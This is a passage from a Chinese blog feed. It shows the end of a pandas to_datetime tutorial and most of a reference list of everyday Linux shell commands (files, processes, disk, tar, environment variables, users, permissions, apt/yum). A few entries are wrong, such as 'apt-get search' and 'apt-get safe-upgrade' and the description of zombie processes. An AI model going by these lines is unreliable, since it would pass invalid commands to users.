日优先，在有的地方会把日期放到最前面，形成日/月/年的形式，如<code>10/11/12</code> 解析为<code>2012-11-10</code></li><li><code>yearfirst</code>: 年优先，适用于2位的年份，如<code>10/11/12</code>解析为<code>2010-11-12</code>，但<code>dayfirst</code>,<code>yearfirst</code>同时为<code>True</code>，<code>yearfirst</code>优先级更高</li></ul><p>返回的时候根据传入的数据结构类型不同，返回结果也不同：</p><ul><li>列表（或类似数据结构）: DatetimeIndex</li><li>Series: Series datetime64 类型</li><li>标量: Timestamp</li></ul><h3 id="to-datetime处理时间戳数据"><a href="#to-datetime处理时间戳数据" class="headerlink" title="to_datetime处理时间戳数据"></a>to_datetime处理时间戳数据</h3><p>有的时候给我们的数据以时间戳的方式存储成字符串，例如<code>1490195805</code>，相应的用<code>to_datetime</code>处理如下：</p><ul><li>以秒为单位  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token number">1490195805</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">'s'</span><span class="token punctuation">)</span>  <span class="token comment"># Timestamp('2017-03-22 15:16:45')</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li><li>以纳秒为单位  <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token number">1490195805433502912</span><span class="token punctuation">,</span> unit<span class="token operator">=</span><span class="token string">'ns'</span><span class="token punctuation">)</span> <span class="token comment">#  Timestamp('2017-03-22 15:16:45.433502912')</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li></ul><h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>假设我们有如下的一组每日降雨记录的数据，每天记录是否降雨：<br><img src="https://img-blog.csdnimg.cn/20200921112722560.png#pic_center" alt=""><br>现在我们希望知道在<code>2019-02-01</code>到<code>2019-02-02</code>时间内降雨的次数。则可通过如下代码实现：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'isRainFall'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'date'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'2019-02-01'</span><span class="token punctuation">,</span><span class="token string">'2019-02-02'</span><span class="token punctuation">,</span><span class="token string">'2019-02-03'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>  <span class="token comment"># 将字符串时间转换成datetime</span>start_date <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token string">'2019-02-01'</span><span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>end_date <span class="token operator">=</span> pd<span class="token punctuation">.</span>to_datetime<span class="token punctuation">(</span><span class="token string">'2019-02-02'</span><span class="token punctuation">,</span><span class="token builtin">format</span><span class="token operator">=</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> start_date<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> end_date<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'isRainFall'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>datetime</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux 常用命令大全</title>
    <link href="/article/48940.html"/>
    <url>/article/48940.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文记录了Linux操作系统中常用的命令以及对应参数，方便使用的时候进行查询，主要参考<code>541137 Linux命令行与shell脚本编程大全.第3版</code>一书，后面还有许多高级的内容，但日常的linux使用下面涉及的已经足够。本文的正确打开方式是作为字典式的命令查询，不建议将这些命令一一背住，只需了解基础的几个就好。 </p><blockquote><p>部分复杂内容添加了配图方便理解，也可以前往我的<a href="https://www.gentlecp.com/articles/676.html">个人博客</a>阅读原文</p></blockquote><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="查看文件ls命令"><a href="#查看文件ls命令" class="headerlink" title="查看文件ls命令"></a>查看文件ls命令</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ls -F  # 用于区分文件和目录ls -a  # 显示隐藏目录和文件ls -R  # 递归显示文件和目录ls -l  # 显示长列表，包含更多信息ls -l file_name  # 过滤显示，可以用?代替一个字符，*代替零个或多个[a-z]表示a-z任一个，！后跟字符表示除这个字符外，！需放置在[]中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="创建文件touch命令"><a href="#创建文件touch命令" class="headerlink" title="创建文件touch命令"></a>创建文件touch命令</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">touch file_name # 创建一个文件，若无则创建，若有则修改文件的修改时间touch -a file_name # 只修改文件的访问时间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p>要查看访问时间用以下命令<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ls -l --time&#x3D;atime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h2 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">cp source destination  # 如果目标文件已存在会强制覆盖cp -i source destination  # 询问是否覆盖cp file dir&#x2F;  # 如果不指定拷贝的文件，只是复制到dir目录下，需要加上&#x2F;cp -R dir1&#x2F; dir2  # 递归复制文件夹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="链接文件"><a href="#链接文件" class="headerlink" title="链接文件"></a>链接文件</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ln -s source destination  # 符号链接，结果：destination-&gt;source,相当于快捷方式ln source destination  # 硬链接，两个相同的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h2 id="移动文件"><a href="#移动文件" class="headerlink" title="移动文件"></a>移动文件</h2><p>类似copy<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">mv source destination  # 可以重命名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">rm -i file  # 建议添加-i询问是否删除，以免误删，因为不能撤销rm -r dir&#x2F;  # 删除文件夹加f参数是强制删除，慎用！！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h2 id="查看文件-类型"><a href="#查看文件-类型" class="headerlink" title="查看文件/类型"></a>查看文件/类型</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">file file_name  # 查看文件内部，给出文件类型，包括编码方式file dir  # 区分目录cat file_name  # 查看文件内容cat -n file_name  # 给所有行加上行号cat -b file_name  # 给有文本的行加上行号more file_name  # 查看文件内容，包含文件所属位置，在每页数据停下tail file_name  # 显示文件最后几行，默认10行tail -n 3 file_name  # 显示最后3行，也可以直接把n换成3tail -f file_name  # 动态查看最后几行，如果有其他进程对文件修改，则会动态加载，用于监视系统日志head file_name  # 显示开头几行，默认10行，除了-f其余属性与tail相同<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="Linux命令行图谱"><a href="#Linux命令行图谱" class="headerlink" title="Linux命令行图谱"></a>Linux命令行图谱</h2><p><img src="https://img-blog.csdnimg.cn/20200302133009486.png#pic_center =500x250" alt=""></p><h1 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h1><p>本章比较复杂，添加了图片做说明</p><h2 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ps -ef  # 显示系统上运行的所有进程，-e指定显示所有运行在系统上的进程，-f扩展了输出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/2020030213303494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><div class="table-container"><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">UID</td><td style="text-align:center">启动这些进程的用户</td></tr><tr><td style="text-align:center">PID</td><td style="text-align:center">进程ID</td></tr><tr><td style="text-align:center">PPID</td><td style="text-align:center">父进程的进程ID</td></tr><tr><td style="text-align:center">C</td><td style="text-align:center">进程生命周期中的CPU利用率</td></tr><tr><td style="text-align:center">STIME</td><td style="text-align:center">进程启动时的系统时间</td></tr><tr><td style="text-align:center">TTY</td><td style="text-align:center">进程启动时的终端设备</td></tr><tr><td style="text-align:center">TIME</td><td style="text-align:center">运行进程需要的累计CPU时间</td></tr><tr><td style="text-align:center">CMD</td><td style="text-align:center">启动的程序名称</td></tr></tbody></table></div><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">ps -l  # 产生一个长格式的输出<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/2020030213305614.png" alt=""></p><div class="table-container"><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">F</td><td style="text-align:center">内核分配给进程的系统标记</td></tr><tr><td style="text-align:center">S</td><td style="text-align:center">进程的状态（O：运行；S：休眠；R：可运行,正等待运行；Z：僵化,进程已结束但父进程已不存在；T:停止）</td></tr><tr><td style="text-align:center">PRI</td><td style="text-align:center">进程的优先级</td></tr><tr><td style="text-align:center">NI</td><td style="text-align:center">谦让度值用来参与决定优先级</td></tr><tr><td style="text-align:center">ADDR</td><td style="text-align:center">进程的内存地址</td></tr><tr><td style="text-align:center">SZ</td><td style="text-align:center">假如进程被换出，所需交换空间的大致大小</td></tr><tr><td style="text-align:center">WCHAN</td><td style="text-align:center">进程休眠的内核函数的地址</td></tr></tbody></table></div><h2 id="实时监测进程"><a href="#实时监测进程" class="headerlink" title="实时监测进程"></a>实时监测进程</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">top  top -l<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h2 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h2><p>kill命令结束进程<br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ps -l  # 通常先用ps命令查看进程IDkill PID  # 根据PID结束进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>killall命令结束进程<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">killall http*  # 结束所有以http开头的进程，允许通过进程名结束进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h1 id="磁盘空间"><a href="#磁盘空间" class="headerlink" title="磁盘空间"></a>磁盘空间</h1><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">df -h  # 查看磁盘使用情况<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/2020030213311057.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">du  # 显示当前目录下所有的文件、目录和子目录的磁盘使用情况du -c # 显示所有已列出文件总的大小du -h # 人性化显示<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h1 id="处理数据文件"><a href="#处理数据文件" class="headerlink" title="处理数据文件"></a>处理数据文件</h1><h2 id="排序数据"><a href="#排序数据" class="headerlink" title="排序数据"></a>排序数据</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">sort file_name  # 按默认的语言排序规则对文本文件数据排序sort -n file_name  # 按数字排序sort -M file_name  # 按三字符月份排序，适用于 Jan，Feb这些打头的sort -f file_name  # 忽略大小写排序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="搜索数据"><a href="#搜索数据" class="headerlink" title="搜索数据"></a>搜索数据</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">grep [options] pattern [file] # 在文件中查找包含匹配指定模式的字符的行grep t file1  # 在file1中找t开头的行grep -v t file1  # 在file1中找不以t开头的行grep -n t file1  # 显示行号grep -c t file1  # 匹配的数量grep [tf] file1  # 在file1中找t或f开头的行，这里也可以用正则表达式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><h2 id="压缩数据"><a href="#压缩数据" class="headerlink" title="压缩数据"></a>压缩数据</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">gzip file  # 压缩文件gzip file*  # 压缩所有匹配的文件gunzip file.gz  # 解压文件 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><h2 id="归档数据"><a href="#归档数据" class="headerlink" title="归档数据"></a>归档数据</h2><p>相比与gzip，tar命令用的更多<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">tar function [options] object1 object2 ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><ul><li><strong>tar命令的功能</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">功能</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">-A</td><td style="text-align:center">将一个已有归档文件追加到另一个已有归档文件</td></tr><tr><td style="text-align:center">-c</td><td style="text-align:center">创建一个新的tar归档文件</td></tr><tr><td style="text-align:center">-d</td><td style="text-align:center">检查归档文件和文件系统的不同之处</td></tr><tr><td style="text-align:center">-r</td><td style="text-align:center">追加文件到已有tar归档文件末尾</td></tr><tr><td style="text-align:center">-t</td><td style="text-align:center">列出已有tar归档文件的内容</td></tr><tr><td style="text-align:center">-u</td><td style="text-align:center">将比tar归档文件中已有的同名文件新的文件追加到该tar归档文件中，简单来说就是更新文件内容</td></tr><tr><td style="text-align:center">-x</td><td style="text-align:center">从已有tar归档文件中提取文件</td></tr></tbody></table></div><ul><li><strong>tar命令的选项</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">选项</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">-C</td><td style="text-align:center">切换到指定目录</td></tr><tr><td style="text-align:center">-f file</td><td style="text-align:center">输出结果到文件或设备file</td></tr><tr><td style="text-align:center">-j</td><td style="text-align:center">将输出重定向给bzip2来压缩内容</td></tr><tr><td style="text-align:center">-p</td><td style="text-align:center">保留所有文件权限</td></tr><tr><td style="text-align:center">-v</td><td style="text-align:center">在处理文件时显示文件</td></tr><tr><td style="text-align:center">-z</td><td style="text-align:center">将输出重定向给gzip命令来压缩内容</td></tr></tbody></table></div><p>常用tar命令结构：<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">tar -cvf test.tar test1&#x2F; test2&#x2F;  # 创建名为test.tar的归档文件，含有test1和test2目录内容 tar -tf test.tar  # 列出tar文件test.tar的内容（并不提取文件）tar -xvf test.tar  # 提取test.tar内容tar -zxvf  test.tgz  # 解压以.tgz结尾的压缩文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></p><h1 id="Linux环境变量"><a href="#Linux环境变量" class="headerlink" title="Linux环境变量"></a>Linux环境变量</h1><p>环境变量的定义：<br>bash shell 用环境变量的特性来存储有关shell会话和工作环境的信息，允许我们在内存中存储数据，以便程序或shell中运行的脚本能够轻松访问到它们。  </p><h2 id="全局环境变量"><a href="#全局环境变量" class="headerlink" title="全局环境变量"></a>全局环境变量</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">printenv  # 查看全局变量<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/20200302133133279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /><br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">printenv HOME  # 显示某个环境变量echo $HOME  # 显示某个环境变量，需要加$，且加了$可以作为命令行参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>设置全局环境变量<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">export variable  # variable是一个局部环境变量，相当于将局部变为全局<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>永久设置全局环境变量：<br>在$HOME/.bashrc 中定义全局环境变量，例如将alias设置放在.bashrc启动文件中 ，或者存储在.profile文件中</p><h2 id="局部环境变量"><a href="#局部环境变量" class="headerlink" title="局部环境变量"></a>局部环境变量</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">set # 显示某个特定进程设置的环境变量<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>设置局部环境变量<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">echo $variablevariable&#x3D;test  # 注意中间不能有空格echo $variable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><br>删除环境变量<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">unset variable  # 注意这时候不加$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h2 id="PATH环境变量"><a href="#PATH环境变量" class="headerlink" title="PATH环境变量"></a>PATH环境变量</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">PATH&#x3D;$PATH:new_dir  # 添加new_dir到PATH中，此修改仅持续到退出或重启系统<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>登录shell后，shell会从以下5个不同的启动文件中读取命令：</p><div class="table-container"><table><thead><tr><th style="text-align:left">文件名</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:left">/etc/profile</td><td style="text-align:left">系统上默认shell启动文件，不分用户。<br>ubantu版本中涉及/etc/bash.bashrc,该文件包含了系统环境变量，但CentOS版本中没有<br>文件中主要for循环迭代启动/etc/profile.d目录下的文件</td></tr><tr><td style="text-align:left">$HOME/.bash_profile</td><td style="text-align:left">检查HOME目录是否有.bashrc,若有，则执行.bashrc里的命令，如果存在则忽略剩下的启动文件</td></tr><tr><td style="text-align:left">$HOME/.bashrc</td><td style="text-align:left">存放启动shell时会执行的命令</td></tr><tr><td style="text-align:left">$HOME/.bash_login</td><td style="text-align:left">功能与bash_profile类似，但执行优先级晚</td></tr><tr><td style="text-align:left">$HOME/.profile</td><td style="text-align:left">同上</td></tr></tbody></table></div><h1 id="Linux文件权限"><a href="#Linux文件权限" class="headerlink" title="Linux文件权限"></a>Linux文件权限</h1><h2 id="添加新用户"><a href="#添加新用户" class="headerlink" title="添加新用户"></a>添加新用户</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">useradd &lt;user&gt;  # 添加一个新用户 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><p>添加用户之后该用户还没有密码，需要通过passwd命令给该用户添加密码<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">passwd &lt;user&gt;  # 输入命令后根据提示输入密码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>通过命令创建的用户存放在/etc/passwd文件中</p><h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">userdel &lt;user&gt;  # 只会删除&#x2F;etc&#x2F;passwd文件中的用户信息，不删除系统中属于该用户的任何文件userdel -r &lt;user&gt;  # 删除该用户在home中的文件和该用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><h2 id="修改用户"><a href="#修改用户" class="headerlink" title="修改用户"></a>修改用户</h2><ul><li><strong>用户账户修改工具</strong></li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">命令</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">usermod</td><td style="text-align:left">修改用户账户字段，还可以指定主要组以及附加组的所属关系</td></tr><tr><td style="text-align:left">passwd</td><td style="text-align:left">修改已有用户的密码</td></tr><tr><td style="text-align:left">chpasswd</td><td style="text-align:left">从文件中读取登录名密码对，并更新密码</td></tr><tr><td style="text-align:left">chage</td><td style="text-align:left">修改密码的过期日期</td></tr><tr><td style="text-align:left">chfn</td><td style="text-align:left">修改用户账户的备注信息</td></tr><tr><td style="text-align:left">chsh</td><td style="text-align:left">修改用户账户的默认登录shell</td></tr></tbody></table></div><ul><li>usermod的参数</li></ul><div class="table-container"><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">用途</th></tr></thead><tbody><tr><td style="text-align:left">-c</td><td style="text-align:left">修改备注字段</td></tr><tr><td style="text-align:left">-e</td><td style="text-align:left">修改过期日期</td></tr><tr><td style="text-align:left">-g</td><td style="text-align:left">修改默认的登录组</td></tr><tr><td style="text-align:left">-l</td><td style="text-align:left">修改用户账户的登录名</td></tr><tr><td style="text-align:left">-L</td><td style="text-align:left">锁定账户，使用户无法登录</td></tr><tr><td style="text-align:left">-p</td><td style="text-align:left">修改账户密码</td></tr><tr><td style="text-align:left">-U</td><td style="text-align:left">接触锁定，使账户能够登录</td></tr></tbody></table></div><h2 id="Linux组"><a href="#Linux组" class="headerlink" title="Linux组"></a>Linux组</h2><p>就是一堆用户共享同一权限，用户组信息保存在/etc/group文件中<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">groupadd group  # 创建新组<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>更多用户组命令由于涉及不多，不一一列举，以后补上</p><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><p>理解ls -l列出的文件权限字段含义</p><p><img src="https://img-blog.csdnimg.cn/20200302133206168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><p>第一个字段是描述文件和目录权限的编码：<br>-:文件<br>d:目录<br>l:链接<br>c:字符型设备<br>b:块设备<br>n:网络设备<br>接着是3组字符的编码：<br>r:可读<br>w:可写<br>x:可执行<br>三组分别是对象属主，对象数组，其他用户  </p><ul><li><strong>默认权限</strong><br>默认权限由umask命令设置，权限的赋予采用八进制，下表记录了常用的权限对应的八进制值  </li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">权限</th><th style="text-align:center">二进制</th><th style="text-align:center">八进制</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">—-</td><td style="text-align:center">000</td><td style="text-align:center">0</td><td style="text-align:center">无权限</td></tr><tr><td style="text-align:center">—x</td><td style="text-align:center">001</td><td style="text-align:center">1</td><td style="text-align:center">只有执行权限</td></tr><tr><td style="text-align:center">-w-</td><td style="text-align:center">010</td><td style="text-align:center">2</td><td style="text-align:center">只有写权限</td></tr><tr><td style="text-align:center">-wx</td><td style="text-align:center">011</td><td style="text-align:center">3</td><td style="text-align:center">写+执行</td></tr><tr><td style="text-align:center">r—</td><td style="text-align:center">100</td><td style="text-align:center">4</td><td style="text-align:center">只读</td></tr><tr><td style="text-align:center">r-x</td><td style="text-align:center">101</td><td style="text-align:center">5</td><td style="text-align:center">读+执行</td></tr><tr><td style="text-align:center">rw-</td><td style="text-align:center">110</td><td style="text-align:center">6</td><td style="text-align:center">读写</td></tr><tr><td style="text-align:center">rwx</td><td style="text-align:center">111</td><td style="text-align:center">7</td><td style="text-align:center">全部权限</td></tr></tbody></table></div><p>umask值是个掩码，会屏蔽不想授予安全级别的权限<br>例如umask = 026 ，则目录的默认权限是 777-026 = 751，文件的默认权限是666-026 = 640<br>umask设置在/etc/prpfile启动文件中  </p><ul><li><strong>改变权限</strong></li></ul><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">chmod 777 file  # 赋予file的所有权限给所有人chmod +x file   # 给所有人添加file的执行权限chmod o+x file  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div><p>chmod [ugoa] [+-=] [rxw] file<br>这种形式允许针对用户或组，添加修改权限，u代表用户，g代表组，o代表其他，a代表上述所有  </p><h1 id="安装软件程序"><a href="#安装软件程序" class="headerlink" title="安装软件程序"></a>安装软件程序</h1><h2 id="基于Debian系统"><a href="#基于Debian系统" class="headerlink" title="基于Debian系统"></a>基于Debian系统</h2><p>采用dpkg命令直接和Linux系统上的PMS（package management system 包管理系统）交互，用来安装、管理和删除软件包<br>包含在此PMS的其他工具有：<br>1、apt-get<br>2、apt-cache<br>3、aptitude  </p><ul><li><strong>用apt-get安装软件包</strong>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">apt-get search package_name  # 查找软件包apt-get install package_name  # 安装软件包apt-get safe-upgrade  # 更新软件包apt-get remove package_name  # 卸载软件,只删除软件包apt-get purge package_name  # 删除软件包和相关的数据和配置文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>ubantu下统一了apt命令，可以将上述全替换成apt</li><li><strong>dpkg安装.deb包</strong>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">dpkg -i jdk-XXX_linux-x64_bin.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li></ul><p>配置文件路径：<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">&#x2F;etc&#x2F;apt&#x2F;sources.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>以搬瓦工的ubantu系统服务器为例<br><img src="https://img-blog.csdnimg.cn/2020030213325689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0dlbnRsZUNQ,size_16,color_FFFFFF,t_70" style="zoom:50%;" /></p><h2 id="7-2-基于Red-Hat系统"><a href="#7-2-基于Red-Hat系统" class="headerlink" title="7.2 基于Red Hat系统"></a>7.2 基于Red Hat系统</h2><p>采用rpm命令，常见的前端工具有：<br>1、yum：在Red Hat 和Fedora使用<br>2、urpm： 在Mandriva使用<br>3、zypper：在openSUSE使用<br>由于yum使用较多，以yum为例  </p><ul><li><p><strong>用yum安装软件包</strong></p>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">yum list installed  # 列出已安装的包yum list installed &gt; installed_software  # 将已安装包的列表重定向到一个文件中  yum install package_name  # 安装软件yum localinstall package_name.rpm  # 本地安装rpm安装包yum list updates  # 列出所有已安装包的可用更新yum update packet_name  # 跟新指定包yum update  # 对更新列表中所有包进行更新yum remove package_name  # 只删除软件包而保留配置文件和数据文件yum erase package_name  #  删除软件和它所有的文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li><li><p><strong>用rpm安装rpm包</strong>  </p>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">rpm -i jdk-XXX_linux-x64_bin.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></li><li><strong>处理损坏包依赖关系</strong>  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">yum clean all 